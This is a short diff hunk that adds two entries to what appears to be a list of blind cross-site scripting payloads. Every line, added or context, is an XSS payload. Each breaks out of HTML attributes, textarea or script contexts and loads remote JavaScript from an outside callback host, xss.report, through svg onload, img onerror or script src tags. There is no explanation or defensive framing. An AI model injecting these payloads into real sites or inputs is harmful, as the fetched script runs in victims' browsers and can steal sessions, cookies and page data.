@@ -1,3 +1,5 @@
+<svg/onload=import('//xss.report/c/hnterx')
+<img/src/onerror=import('//xss.report/c/hnterx');//>
 ';"/></script><script/src=//xss.report/c/hnterx?1>
 ';"/></textarea></script><script/src=//xss.report/c/hnterx?1
 '"><script src=https://xss.report/c/hnterx?1></script>
